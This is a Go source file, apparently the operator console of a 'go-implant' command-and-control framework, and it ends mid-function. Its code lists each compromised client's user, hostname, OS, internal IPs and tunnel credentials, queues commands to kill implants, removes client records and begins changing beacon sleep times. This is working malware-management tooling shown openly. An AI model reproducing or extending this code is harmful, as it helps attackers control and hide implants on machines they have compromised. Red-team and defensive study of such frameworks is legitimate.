package view

import (
	"go-implant/common/communication"
	"go-implant/server/config"
	"go-implant/server/model"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

// seed random
func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

// colors
var green = color.New(color.FgGreen)
var yellow = color.New(color.FgYellow)
var cyan = color.New(color.FgCyan)
var red = color.New(color.FgRed)

func printClientInfo(UID string) {
	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)
	fmt.Printf("UID: %s\n", client.Beacon.UID)
	fmt.Printf("CurrentUser: %s\n", client.Beacon.CurrentUser)
	fmt.Printf("Hostname: %s\n", client.Beacon.Hostname)
	fmt.Printf("OS: %s\n", client.Beacon.OS)
	fmt.Printf("Internal IPs: %s\n", client.Beacon.InternalIPS)
	fmt.Printf("Commands in queue: %s\n", client.Commandqueue)
	fmt.Printf("Sleeptime: %d seconds\n", client.Beacon.Sleeptime)
	fmt.Printf("Last active: %s ago\n", time.Since(client.Lastactive).Truncate(time.Second))
	if client.Username != "" && client.Password != "" && client.Forward != nil {
		for _, listener := range client.Forward.Listeners {
			fmt.Printf("Tunnel active.\n\tAddress: %s\n\tUsername: %s\n\tPassword: %s\n\n", listener.Addr(), client.Username, client.Password)
		}
	} else {
		fmt.Printf("No tunnel active to this host\n\n")
	}
}

// kill client
func assignKill(UID string) {
	fmt.Printf("Killing client %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted killing client")
		return
	}

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	comm := communication.Command{Command: communication.Quit, Args: nil}
	client.Commandqueue = append(client.Commandqueue, comm)

	model.Store(UID, client) // store the modified client
	fmt.Println("Command added to queue.")

	printClientInfo(UID)
}

// remove client record
func removeClient(UID string) {
	fmt.Printf("Removing client record %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted removing client record")
		return
	}

	// remove the client record
	model.Remove(UID)
	fmt.Printf("Client record %s removed\n\n", UID)
}

// Set new sleeptime for client
func setSleeptime(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	fmt.Printf("Sleeptime now: %d seconds\n", client.Beacon.Sleeptime)

	// choose command to delete
	va